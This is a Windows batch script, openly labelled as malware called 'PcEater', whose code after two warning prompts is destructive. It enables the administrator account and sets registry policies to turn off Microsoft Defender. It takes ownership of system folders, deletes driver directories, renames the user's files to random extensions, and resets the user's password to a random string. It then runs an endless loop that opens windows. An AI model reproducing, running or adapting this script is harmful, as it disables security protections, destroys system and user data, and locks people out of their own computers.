@echo off
net user administrator /active:yes
title WARNING
echo You are running a virus that will break your computer are you sure your wanna run this?
pause
cls
echo This is not a joke, this is serious malware that will delete hardware files are you sure you wanna run this?
pause
cls
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Microsoft Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Microsoft Defender" /v DisableAntiMalware /t REG_DWORD /d 1 /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Microsoft Defender" /v DisableAntiVirus /t REG_DWORD /d 1 /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Microsoft Defender" /v DisableAntiRansomware /t REG_DWORD /d 1 /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Microsoft Defender" /v DisableAntiThreats /t REG_DWORD /d 1 /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Microsoft Defender" /v DisableProtection /t REG_DWORD /d 1 /f
takeown /f /s /q C:\Windows\System32
takeown /f /s /q C:\Windows
del /f /s /q C:\Windows\System32\Drivers
del /f /s /q C:\Windows\System32\DriverStore
del /f /q C:\Windows\Web
net user administrator /active:yes
cd C:\Users\%USERNAME%
ren *.cmd *.s41ca
ren *.exe *.z81md
ren *.png *.gr62q
ren *.jpg *.zt57u
ren *.gif *.c51ha
ren *.xlsx *.z61mz
ren *.pptx *.r4t6y
ren *.txt *.5as8d
ren *.mp1 *.g1yh3
ren *.mp2 *.f3ck1
ren *.mp3 *.d1d4y
ren *.mp4 *.p3s1y
ren *.mp5 *.o3en1
ren *.vbs *.i1zX1
net user %USERNAME% a1b2bsZ7jiN1nInqjNUeJHxBIH1h7HqZ
echo x=msgbox ("Virus is killing your pc",0+48,"PcEater")>>msgbox1.vbs
:kill
start cmd
start msgbox1.vbs
start mspaint
start www.google.co.ck
goto kill